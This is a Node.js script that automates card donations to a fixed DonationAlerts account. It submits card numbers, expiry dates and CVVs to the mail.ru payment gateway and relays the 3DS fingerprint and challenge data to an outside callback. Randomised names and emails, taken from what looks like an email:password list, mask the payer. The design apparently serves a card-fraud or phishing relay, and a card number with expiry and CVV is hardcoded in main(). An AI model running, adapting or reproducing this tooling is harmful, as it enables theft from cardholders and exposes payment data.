const axios = require('axios');
const crypto = require('crypto');
const { readFileSync } = require('fs');
const HttpsProxyAgent = require('https-proxy-agent');

const DONATION_TEXTS = readFileSync(__dirname + '/donations.txt').toString().split('\n');
function genText () {
    const parts = randInt(3);
    let result = '';
    for (let i = 0; i < parts; i++) {
        result += randItem(DONATION_TEXTS) + ' ';
    }

    return result;
}

const EMAILS = readFileSync(__dirname + '/emails.txt').toString().split('\n');
function genEmail () {
    return randItem(EMAILS).split(':')[0];
}

const NICKNAMES = readFileSync(__dirname + '/nicknames.txt').toString().split('\n');
function genNicknames () {
    return randItem(NICKNAMES).split(':')[0];
}

const sleep = ms => new Promise(r => setTimeout(r, ms));

waitResponse = async (options, checkResponse) => {
	const attempts = options.attempts || 3;

	let response;
	for (let i = 0; i < attempts; i++) {
		response = await axios(options);
		if (checkResponse(response.data)) break;

		await sleep(1000);
	}

	return response;
}

randInt = max => Math.round(Math.random() * max);
randItem = array => array[randInt(array.length - 1)];

class DonationAlerts {
    constructor(data) {
        if (!data || !data.card) return;
        
        this.link = String(data.donateLink);
        this.amount = String(data.amount);
        this.method = String(data.method);
        this.pay_id = String(data.pay_id);
        this.donateLink = String(data.donateLink);
        if(data.foreign) this.foreign = Boolean(data.foreign);
        this.proxy_email;
        this.card = {
            pan: String(data.card.pan),
            expire: String(data.card.expire),
            cvv: String(data.card.cvv)
        };
    }

    async startFlow (updatePayment, is_vb = false) {
        let res;

        // todo: proxy random
        // const httpsAgent = new HttpsProxyAgent({
        //     host: proxy_url.hostname,
        //     port: proxy_url.port,
        //     auth: `${proxy_url.username}:${proxy_url.password}`
        // });

        const payer = await axios({
            method: 'POST',
            url: 'https://www.donationalerts.com/api/v1/anonymouspayer',
            // httpsAgent
        });
        if(!payer) return { ok: false, message: 'Payer creation error', code: 502 };

        const invoice = await axios({
            method: 'POST',
            url: 'https://www.donationalerts.com/api/v1/payin/invoice',
            // httpsAgent,
            data: {
                type: 'donation',
                amount: this.amount,
                currency: 'RUB',
                user_id: 12485464,
                message_type: 'text',
                name: genNicknames(),
                donation_tts_voice_lang: 'ru_RU',
                donation_tts_voice_id: 1,
                email: genEmail(),
                system: this.foreign ? 'bankCardUsd' : 'bankCardRub',
                commission_covered: this.foreign ? 1 : 0,
                extra: {
                    apid: payer.data.apid
                }
            }
        });

        console.log(invoice.data)
        if(!invoice || !invoice.data.data || !invoice.data.data.redirect_url) return { ok: false, message: 'Payment creation error', code: 500 };
        
        await axios({
            url: invoice.data.data.redirect_url,
            // httpsAgent,
            beforeRedirect: (options, response) => {
                let url = options.href;
                console.log(url)
                if(!url.includes('cpg.money.mail.ru/api/page/freepay')) return false;
                url = url.replace('https://cpg.money.mail.ru/api/page/freepay/?', '').split('&');
                let obj = {};
                for(let item of url) {
                    let i = item.split('=');
                    obj[i[0]] = i[1];
                }
                res = obj;
                return false;
            }
        });

        while(!res) {
            await sleep(500);
        }

        const detailsRes = await axios({
            method: 'POST',
            url: 'https://cpg.money.mail.ru/api/in/order/pay',
            // httpsAgent,
            data: {
                session_id: res.session_id,
                signature: res.signature,
                pan: this.card.pan,
                exp_date: this.card.expire,
                cvv: this.card.cvv,
                cardholder: 'SIMPLE MAILRU'
            },
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        });
        if (!detailsRes) return { ok: false, message: 'Card details submission failed', code: 502 };

        console.log(detailsRes.data)

        const statusUpdate = { method: 'GET', url: detailsRes.data.url, attempts: 5 };

        console.log(this.foreign ? 'Foreign' : 'RU');

        console.log(statusUpdate);

        if(!this.foreign) {
            const paReq = await waitResponse(statusUpdate, data => data.transaction_status == '3DS_FINGERPRINT');

            console.log('Ловим парек');
            console.log(paReq.data);

            setTimeout(async () => {
                const caReq = await waitResponse(statusUpdate, data => data.transaction_status == '3DS_CHALLANGE');

                if (!caReq.data.threeds_challenge) {
                    console.log('Крека нет');
                    console.log(caReq.data);
                } else {
                    console.log('Ловим крек');
                    updatePayment('processing', {
                        challange: {
                            post: caReq.data.threeds_challenge.acs_url,
                            payload: { creq: caReq.data.threeds_challenge.creq }
                        }
                    });
                }

                statusUpdate.attempts = 10 * 60;
                const statusRes = await waitResponse(statusUpdate, data => {
                    const isTds = Object.keys(data).find(k => k.startsWith('threeds_'));
                    return !isTds && (data.status == 'ERR_FINISH' || data.status == 'OK_FINISH');
                });
                console.log(statusRes.data);
                if (statusRes.data.status == 'OK_FINISH' && statusRes.data.order_status && statusRes.data.order_status == 'PAID') {
                    console.log('Проведён');
                    updatePayment('paid', null);
                } else if (statusRes.data.error) {
                    console.log('Отклонено: ' + statusRes.data.error.descr);
                    updatePayment('failed', { rejectReason: statusRes.data.error.descr });
                }
            }, 1500);

            const redirect = { updateInterval: 1000 };
            
            if (paReq.data.threeds_fingerprint) {
                redirect.post = paReq.data.threeds_fingerprint.method_url;
                redirect.payload = { threeDSMethodData: paReq.data.threeds_fingerprint.method_data };
            } else if (paReq.data.threeds_data) {
                redirect.post = paReq.data.acs_url;
                redirect.payload = paReq.data.threeds_data;
            } else {
                return { ok: false, message: 'Не удалось провести платёж, повторите попытку позже', code: 502 };
            }

            return { ok: true, redirect }
        } else {
            const paReq = await waitResponse(statusUpdate, data => {
                console.log('pareq', data);

                return data.transaction_status == '3DS_ENROLLED';
            });

            setTimeout(async () => {
                statusUpdate.attempts = 10 * 60;
                const statusRes = await waitResponse(statusUpdate, data => !data.threeds_data && (data.status == 'ERR_FINISH' || data.status == 'OK_FINISH'));
                
                console.log(statusRes.data);

                if (statusRes.data.status == 'OK_FINISH' && statusRes.data.order_status && statusRes.data.order_status == 'PAID') {
                    console.log('Проведён');
                    updatePayment('paid', null);
                } else if (statusRes.data.error) {
                    console.log('Отклонено: ' + statusRes.data.error.descr);
                    updatePayment('failed', { rejectReason: statusRes.data.error.descr });
                }
            }, 1500);

            return {
                ok: true,
                redirect: {
                    post: paReq.data.acs_url,
                    payload: paReq.data.threeds_data,
                    updateInterval: 1000
                }
            }
        }
    }
}

module.exports = DonationAlerts;

async function main() {
    const da = new DonationAlerts({
        card: {
            pan: '2202208123981335',
            expire: '12.2029',
            cvv: '125'
        },
        amount: '100',
        method: 'card',
        foreign: false
    });

    console.log(await da.startFlow(data => console.log(data), false));
}

main();